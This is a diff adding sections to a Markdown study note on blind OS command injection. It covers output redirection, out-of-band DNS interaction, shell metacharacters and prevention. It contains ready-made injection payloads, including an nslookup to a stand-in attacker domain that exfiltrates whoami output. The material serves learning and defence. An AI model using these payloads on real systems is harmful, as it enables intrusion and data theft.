@@ -83,7 +83,76 @@ An injected command can be used to trigger a time delay, with the purpose of det
 
 Which will cause the application to ping its loopback interface for 10 seconds.
 
+### Exploitation example
 
+[[Blind OS command injection with time delays]]
 
+### Redirecting output
 
+Inject a command, then redirect it's output to a file, place it a location in which it can be retrieved with the browser, depending on wether the application serves static resources or not. Use a payload like:
 
+`& whoami > /var/www/static/whoami.txt &`
+
+(the payload above assumes that the web application uses the system location `/var/www/static` to retieve resources and also that the server runs Linux OS)
+
+The `>` character sends the output from the `whoami` command to the specified file. You can then use the browser to fetch `https://vulnerable-website.com/whoami.txt` to retrieve the file, and view the output from the injected command.
+
+### Exploitation example
+
+[[Blind OS command injection with output redirection]]
+
+<hr>
+
+## Command injection using out-of-band (OAST) techniques
+
+The goal is injecting a command that triggers an out-of-band network interaction with an attacker controlled system.
+
+`& nslookup kgji2ohoyw.web-attacker.com &`
+
+The `nslookup` command causes a DNS lookup for the specified domain. So that he attacker can confirm that the command was executed by the server.
+
+### Data exfiltration
+
+The out-of-band channel also provides an easy way to exfiltrate the output from injected commands:
+
+``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &``
+
+This will cause a DNS lookup to the attacker's domain containing the result of the `whoami` command:
+
+`wwwuser.kgji2ohoyw.web-attacker.com`
+
+<hr>
+
+## Ways to inject commands
+
+Useful shell metacharacters to inject commands.
+
+Metacharacters | Unix | Windows
+---------------|-------|------------
+Name of current user |[x]|[x]
+`&`| [x]| [x]
+`&&` |[x]|[x]
+\| |[x]|[x]
+\|\| |[x]|[x]
+`;` |[x]|[]
+`Newline (0x0a or \n)` |[x]|[]
+\`injected command\`  |[x]|[]
+$(injected command)  |[x]|[]
+
+Note that the different shell metacharacters have subtly different behaviors that might affect whether they work in certain situations, and whether they allow in-band retrieval of command output or are useful only for blind exploitation.
+
+Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using `"` or `'`) before using suitable shell metacharacters to inject a new command.
+
+<hr>
+
+## How to prevent OS command injection attacks
+
+By far the most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code. In virtually every case, there are alternate ways of implementing the required functionality using safer platform APIs.
+
+If it is considered unavoidable to call out to OS commands with user-supplied input, then strong input validation must be performed. Some examples of effective validation include:
+
+-   Validating against a whitelist of permitted values.
+-   Validating that the input is a number.
+-   Validating that the input contains only alphanumeric characters, no other syntax or whitespace.
+
+Never attempt to sanitize input by escaping shell metacharacters. In practice, this is just too error-prone and vulnerable to being bypassed by a skilled attacker.
